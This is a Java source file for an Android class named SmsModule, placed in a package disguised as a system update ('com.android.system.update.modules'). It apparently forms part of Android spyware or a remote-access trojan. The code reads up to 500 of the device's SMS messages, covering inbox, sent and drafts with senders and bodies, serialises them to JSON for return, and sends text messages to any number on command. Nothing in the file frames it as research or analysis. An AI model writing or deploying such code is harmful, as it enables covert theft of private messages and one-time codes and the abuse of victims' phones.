package com.android.system.update.modules;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Base64;
import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONObject;

public class SmsModule {
    private Context context;
    
    public SmsModule(Context context) {
        this.context = context;
    }
    
   public String getSms() {
    if (!checkReadPermission()) return "ERROR: No SMS read permission";

    try {
        JSONArray smsList = new JSONArray();
        ContentResolver cr = context.getContentResolver();

        // Query ALL SMS (inbox + sent + drafts) — no LIMIT in the selection
        // Sort newest first, cap at 500 to avoid huge payloads
        Cursor cursor = cr.query(
            Uri.parse("content://sms"),
            new String[]{"_id", "address", "body", "date", "type", "read"},
            null,
            null,
            "date DESC"
        );

        int count = 0;
        final int MAX_SMS = 500;

        if (cursor != null && cursor.moveToFirst()) {
            int addressIdx = cursor.getColumnIndex("address");
            int bodyIdx    = cursor.getColumnIndex("body");
            int dateIdx    = cursor.getColumnIndex("date");
            int typeIdx    = cursor.getColumnIndex("type");
            int readIdx    = cursor.getColumnIndex("read");

            do {
                JSONObject sms = new JSONObject();
                sms.put("address", cursor.getString(addressIdx));
                sms.put("body",    cursor.getString(bodyIdx));
                sms.put("date",    cursor.getLong(dateIdx));

                // type: 1 = inbox, 2 = sent, 3 = draft, 4 = outbox, 5 = failed
                int type = cursor.getInt(typeIdx);
                switch (type) {
                    case 1:  sms.put("type", "inbox");  break;
                    case 2:  sms.put("type", "sent");   break;
                    case 3:  sms.put("type", "draft");  break;
                    default: sms.put("type", "other");  break;
                }

                sms.put("read", cursor.getInt(readIdx) == 1);
                smsList.put(sms);
                count++;
            } while (cursor.moveToNext() && count < MAX_SMS);

            cursor.close();
        }

        return smsList.toString();

    } catch (Exception e) {
        e.printStackTrace();
        return "ERROR: " + e.getMessage();
    }
}
    
    public String sendSms(String number, String message) {
        if (!checkSendPermission()) return "ERROR: No SMS send permission";
        
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, message, null, null);
            return "SMS sent to " + number;
        } catch (Exception e) {
            e.printStackTrace();
            return "ERROR: " + e.getMessage();
        }
    }
    
    private boolean checkReadPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
            == PackageManager.PERMISSION_GRANTED;
    }
    
    private boolean checkSendPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS)
            == PackageManager.PERMISSION_GRANTED;
    }
}
